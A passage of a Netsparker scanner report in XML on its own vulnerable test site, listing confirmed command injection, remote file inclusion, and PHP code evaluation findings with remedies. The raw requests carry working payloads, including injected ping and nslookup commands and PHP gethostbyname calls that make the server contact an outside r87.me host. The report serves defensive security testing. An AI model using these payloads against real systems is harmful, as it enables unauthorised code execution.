					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/system.diagnostics.process%28VS.71%29.aspx&#39;&gt;Process class in .NET&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.htbridge.com/vulnerability/os-command-injection.html&#39;&gt;OS Command Injection [CWE-78]&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>POST</vulnerableparametertype>
						<vulnerableparameter>param</vulnerableparameter>
						<vulnerableparametervalue>&amp;apos;&amp;amp; ping -n 25 127.0.0.1 &amp;amp;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[POST /nslookup.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 37
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/nslookup.php
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

param=%27%26+ping+-n+25+127.0.0.1+%26]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 5261
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:14:30 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;script type=text/javascript src = &quot;&quot; &gt;&lt;/script&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Products &lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;
                    &lt;form action=&quot;/nslookup.php&quot; method=&quot;POST&quot;&gt;
                           &lt;table class=&quot;databases&quot;&gt;
            &lt;tr&gt;
                &lt;td colspan=&quot;3&quot;&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=&quot;label&quot; style=&quot;width: 89px&quot;&gt;
                    &lt;label&gt;IP Adress:&lt;/label&gt;&lt;/td&gt;
                &lt;td class=&quot;style3&quot;&gt;
                    &lt;input type=&quot;text&quot; size=&quot;40&quot; name=&quot;param&quot; id=&quot;param&quot; class=&quot;input&quot;/&gt;
                &lt;/td&gt;
                &lt;td class=&quot;style1&quot;&gt;
                    &lt;input type=&quot;submit&quot; value=&quot;GO&quot; class=&quot;button&quot; id=&quot;submit&quot;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>31</WASC>
							<CWE>78</CWE>
							<CAPEC>88</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>6.8</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>6.8</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>6.8</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/process.php?file=http%3a%2f%2fr87.com%2fn%3f%00.nsp</url>
					<type>Rfi</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a remote file inclusion vulnerability on the target web application.&lt;/p&gt;&lt;p&gt;This occurs when a file from any location can be injected into the attacked page and included as source code for parsing and execution.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Impact may differ depending on the execution permissions of the web server user. Any included source code could be executed by the web server in the context of the web server user, hence making arbitrary code execution possible. Where the web server user has administrative privileges, full system compromise is also possible.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;Wherever possible, do not allow the appending of file paths as a variable. File paths should be hard-coded or selected from a small pre-defined list.&lt;/li&gt;&lt;li&gt;Where dynamic path concatenation is a major application requirement, ensure input validation is performed and that you only accept the minimum characters required - for example &quot;a-Z0-9&quot; - and that you filter out and do not allow characters such as &quot;..&quot; or &quot;/&quot; or &quot;%00&quot; (null byte) or any other similar multifunction characters.&lt;/li&gt;&lt;li&gt;It&#39;s important to limit the API to only allow inclusion from a directory or directories below a defined path.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;There are freely available web backdoors/shells for exploiting remote file inclusion vulnerabilities and using them requires little knowledge or attack skills. This has typically been one of the most widely leveraged web application vulnerabilities; therefore, there is a high level of information readily available to attacks on how to mount and successfully undertake these forms of attacks.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;http://projects.webappsec.org/Remote-File-Inclusion&#39;&gt;WASC - Remote File Inclusion&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/remote-file-inclusion-vulnerability/&#39;&gt;Remote File Inclusion Vulnerabilities Information &amp;amp; Prevention&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>file</vulnerableparameter>
						<vulnerableparametervalue>http://r87.com/n?ï¿½.nsp</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /process.php?file=http%3a%2f%2fr87.com%2fn%3f%00.nsp HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 1383
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:56 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	    &lt;span class=&quot;highlight&quot;&gt;NETSPARKER_F0M1&lt;/span&gt;-44353702950-&lt;script&gt;netsparkerRFI(0x066666)&lt;/script&gt;	&lt;!-- process.php load pages from path of the website. --&gt;
	&lt;!-- FIXME: File / directory permissions --&gt;
	&lt;!-- end #page --&gt;
&lt;/div&gt;

&lt;div id=&quot;footer&quot;&gt;
		&lt;p&gt;Copyright (c) 2010 testsparker.com. All rights reserved. Design by &lt;a href=&quot;http://www.freecsstemplates.org/&quot;&gt;Free CSS Templates&lt;/a&gt;.&lt;/p&gt;
	&lt;/div&gt;	&lt;!-- end #footer --&gt;
&lt;/body&gt;
&lt;/html&gt;
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs><proof>
<key><![CDATA[whoami]]></key>
<value><![CDATA[ip-ac1e00fc\apacheuser]]></value>
</proof>
</proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>5</WASC>
							<CWE>98</CWE>
							<CAPEC>193</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N</vector>

									<score>
										<type>Base</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/hello.php?name=%2bprint(int)0xFFF9999-22%3b%2f%2f</url>
					<type>RcePhp</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a Code Evaluation (PHP), which occurs when input data is run as source code.&lt;/p&gt;
&lt;p&gt;This is a highly critical issue and should be addressed as soon as possible.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can execute arbitrary PHP code on the system. The attacker may also be able to execute arbitrary system commands.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Do not accept input from end users which will be directly interpreted as source code. If this is a business requirement, validate all input to the application by removing any data that could be directly interpreted as PHP source code.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;This vulnerability is not difficult to leverage. PHP is a high level language for which there are vast resources available. Successful exploitation requires knowledge of the programming language, access to the source code or the ability to produce source code for use in such attacks, and minimal attack skills.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Direct_Dynamic_Code_Evaluation_(&amp;apos;Eval_Injection&amp;apos;)&#39;&gt;OWASP - Direct Dynamic Code Evaluation&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Code_Injection&#39;&gt;OWASP - Code Injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>name</vulnerableparameter>
						<vulnerableparametervalue>+print(int)0xFFF9999-22;//</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /hello.php?name=%2bprint(int)0xFFF9999-22%3b%2f%2f HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Hello Service &lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Hello Visitor&lt;span class=&quot;highlight&quot;&gt;268409219&lt;/span&gt;21$str = 21 +print(int)0xFFF9999-22;//;21                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs><proof>
<key><![CDATA[whoami]]></key>
<value><![CDATA[ip-ac1e00fc\apacheuser]]></value>
</proof>
</proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC></WASC>
							<CWE>95</CWE>
							<CAPEC>23</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/hello.php?name=%2bgethostbyname(trim(%27o3hfzt7hz1ydm4j2jxmpixfo2w0nuccqrjnfzr-e%27.%27g5w.r87.me%27))%3b%2f%2f</url>
					<type>OutOfBandRcePhp</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a Remote Code Evaluation (PHP) by capturing a DNS A request, which occurs when input data is run as code.&lt;/p&gt;
&lt;p&gt;This is a highly critical issue and should be addressed as soon as possible.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can execute arbitrary PHP code on the system. The attacker may also be able to execute arbitrary system commands.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Do not accept input from end users that will be directly interpreted as source code. If this is a business requirement, validate all the input on the application and remove all the data that could be directly interpreted as PHP source code.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;This vulnerability is not difficult to leverage. PHP is a high level language for which there are vast resources available. Successful exploitation requires knowledge of the programming language, access to the source code or the ability to produce source code for use in such attacks, and minimal attack skills.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Direct_Dynamic_Code_Evaluation_(&amp;apos;Eval_Injection&amp;apos;)&#39;&gt;OWASP - Direct Dynamic Code Evaluation&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Code_Injection&#39;&gt;OWASP - Code Injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>name</vulnerableparameter>
						<vulnerableparametervalue>+gethostbyname(trim(&amp;apos;o3hfzt7hz1ydm4j2jxmpixfo2w0nuccqrjnfzr-e&amp;apos;.&amp;apos;g5w.r87.me&amp;apos;));//</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /hello.php?name=%2bgethostbyname(trim(%27o3hfzt7hz1ydm4j2jxmpixfo2w0nuccqrjnfzr-e%27.%27g5w.r87.me%27))%3b%2f%2f HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 2828
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:10:49 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Hello Service &lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Hello Visitor38.184$str = 38.184 +gethostbyname(trim(&#39;o3hfzt7hz1ydm4j2jxmpixfo2w0nuccqrjnfzr-e&#39;.&#39;g5w.r87.me&#39;));//;38.184                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot; &gt;
						&lt;form method=&quot;get&quot; action=&quot;artist.php&quot;&gt;
							&lt;div&gt;
								&lt;input type=&quot;text&quot; name=&quot;s&quot; id=&quot;search-text&quot; value=&quot;&quot; /&gt;
								&lt;input type=&quot;submit&quot; id=&quot;search-submit&quot; value=&quot;GO&quot; /&gt;
							&lt;/div&gt;
						&lt;/form&gt;

					&lt;/div&gt;
					&lt;div style=&quot;clear: both;&quot;&gt;
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC></WASC>
							<CWE>95</CWE>
							<CAPEC>23</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</vector>

									<score>
										<type>Base</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/nslookup.php</url>
					<type>OutOfBandCommandInjection</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a command injection by capturing a DNS A request, which occurs when input data is interpreted as an operating system command.&lt;/p&gt;&lt;p&gt;This is a highly critical issue and should be addressed as soon as possible.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can execute arbitrary commands on the system.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;If possible, do not invoke system commands from the application.&lt;/li&gt;&lt;li&gt;Find all instances of similar code and make the code changes outlined in the remedy section.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Before invoking system commands within an application, consider using an API, which allows you to separate commands and parameters. This can avoid many of the problems associated with command execution. See the external references for some examples. If this is not possible, whitelist all input and encode it in accordance with the underlying subsystem. (&lt;em&gt;e.g. if it is Windows, then you need to escape from cmd.exe control characters&lt;/em&gt;)&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;This is an easy issue to exploit, requiring little skill or knowledge. Most knowledgeable attackers can gain remote access over such a system within minutes.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/command-injection-vulnerability/&#39;&gt;Command Injection Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Command_Injection&#39;&gt;OWASP - Command Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://projects.webappsec.org/w/page/13246950/OS%20Commanding&#39;&gt;WASC - OS Commanding&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/system.diagnostics.process%28VS.71%29.aspx&#39;&gt;Process class in .NET&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://www.php.net/manual/en/ref.exec.php&#39;&gt;Program execution Functions in PHP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>POST</vulnerableparametertype>
						<vulnerableparameter>param</vulnerableparameter>
						<vulnerableparametervalue>&amp;apos;&amp;amp; nslookup o3hfzt7hz1-kmxmvfqmlu-ov_4gsfd09uzu86xrs^zz4.r87.me&amp;amp;&amp;apos;\&amp;quot;`0&amp;amp;nslookup o3hfzt7hz1-kmxmvfqmlu-ov_4gsfd09uzu86xrs^zz4.r87.me&amp;amp;`&amp;apos;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[POST /nslookup.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 165
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/nslookup.php
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

param=%27%26+nslookup+o3hfzt7hz1-kmxmvfqmlu-ov_4gsfd09uzu86xrs%5ezz4.r87.me%26%27%5c%22%600%26nslookup+o3hfzt7hz1-kmxmvfqmlu-ov_4gsfd09uzu86xrs%5ezz4.r87.me%26%60%27]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 4007
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:15:31 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;script type=text/javascript src = &quot;&quot; &gt;&lt;/script&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
